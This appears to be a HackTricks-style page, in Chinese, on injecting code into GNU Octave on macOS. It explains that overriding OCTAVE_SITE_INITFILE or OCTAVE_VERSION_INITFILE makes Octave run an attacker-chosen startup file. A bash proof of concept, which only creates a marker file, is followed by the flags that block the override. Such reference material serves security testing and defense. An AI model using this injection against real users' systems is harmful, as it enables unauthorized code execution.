# macOS GNU Octave Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

GNU Octave 在启动期间会执行多个包含有效 Octave 命令的文件。`OCTAVE_SITE_INITFILE` 会覆盖全站范围的启动文件，而 `OCTAVE_VERSION_INITFILE` 会覆盖特定版本的启动文件，因此任一变量都可以将自动执行重定向到攻击者可读取的文件。<sup>[[1]](#references)</sup>
```bash
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE

OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```
`--no-init-file` 只会跳过用户文件，例如 `~/.octaverc`；它**不会**阻止上面的 site-file 覆盖。对于 site files，请使用 `--no-site-file`；或者使用 `--norc` / `-f` 禁用所有启动文件。<sup>[[2]](#references)</sup>

## References

- [1] [GNU Octave 启动文件](https://docs.octave.org/latest/Startup-Files.html)
- [2] [GNU Octave 命令行选项](https://docs.octave.org/latest/Command-Line-Options.html)
{{#include ../../../banners/hacktricks-training.md}}
